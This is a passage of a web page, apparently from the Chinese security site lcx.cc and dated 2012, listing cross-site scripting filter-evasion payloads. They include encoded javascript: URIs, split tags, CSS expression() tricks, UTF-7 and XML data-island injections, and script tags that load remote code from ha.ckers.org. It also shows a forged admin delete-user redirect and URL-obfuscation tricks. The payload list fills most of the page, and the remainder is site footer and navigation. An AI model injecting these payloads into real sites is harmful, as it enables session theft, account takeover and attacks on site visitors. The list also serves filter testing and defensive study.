+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+&lt;IMG SRC="jav	ascript:alert('XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
+
+
+&lt;IMG
+SRC
+=
+"
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+'
+)
+"
+&gt;
+
+
+&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
+
+&lt;SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
+
+&lt;SCRIPT/SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt;B&gt;
+
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+
+&lt;IMG SRC="javascript:alert('XSS')"
+
+&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
+
+&lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt;
+\";alert('XSS');//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
+&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
+&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
+&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;
+&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;
+&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
+&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;
+&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;
+&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
+&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
+&lt;IMG SRC="mocha:[code]"&gt;
+&lt;IMG SRC="livescript:[code]"&gt;
+?script?alert(￠XSS￠)?/script?
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
+&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
+&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
+&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
+&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"&gt;
+&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
+&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
+&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
+
+exp/*&lt;A STYLE='no\xss:noxss("*//*");
+xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;
+
+&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
+
+&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+
+&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;
+
+&lt;BASE HREF="javascript:alert('XSS');//"&gt;
+&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
+
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;
+
+----------------------------------------------------------------------------------------------
+&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+
+----------------------------------------------------------------------------------------------
+&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
+
+
+----------------------------------------------------------------------------------------------
+a="get";
+b="URL(\"";
+c="javascript:";
+d="alert('XSS');\")";
+eval(a+b+c+d);
+
+----------------------------------------------------------------------------------------------
+&lt;HTML xmlns:xss&gt;
+  &lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt;
+  &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;
+
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+
+&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+
+&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;
+
+
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+
+
+
+----------------------------------------------------------------------------------------------
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+
+
+----------------------------------------------------------------------------------------------
+
+
+&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
+
+
+
+&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
+
+&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
+
+
+
+&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
+
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+
+&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"&gt;
+
+&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+
+----------------------------------------------------------------------------------------------
+&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT ="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT a="&gt;" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT a=`&gt;` SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+
+----------------------------------------------------------------------------------------------
+
+&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="h
+tt	p://6&amp;#9;6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="//google"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
+
+&lt;A HREF="http://www.gohttp://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;</pre>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-12-17
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E8%B7%A8%E7%AB%99/">跨站</a>
+          <a href="https://lcx.cc/tags/%E9%82%AE%E7%AE%B1/">邮箱</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/asp/">ASP</a>
+          <a href="https://lcx.cc/tags/cmd/">Cmd</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/css/">CSS</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/google/">Google</a>
+          <a href="https://lcx.cc/tags/hack/">Hack</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/jsp/">Jsp</a>
+          <a href="https://lcx.cc/tags/microsoft/">Microsoft</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/putty/">Putty</a>
+          <a href="https://lcx.cc/tags/seo/">SEO</a>
+          <a href="https://lcx.cc/tags/shell/">Shell</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/vb/">VB</a>
+          <a href="https://lcx.cc/tags/vbs/">VBS</a>
+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3168/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">利用 xss 执行 sql 注入</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3166/">
+            <span class="next-text nav-default">JWPlayer Xss 0day [Flash编程安全问题]</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
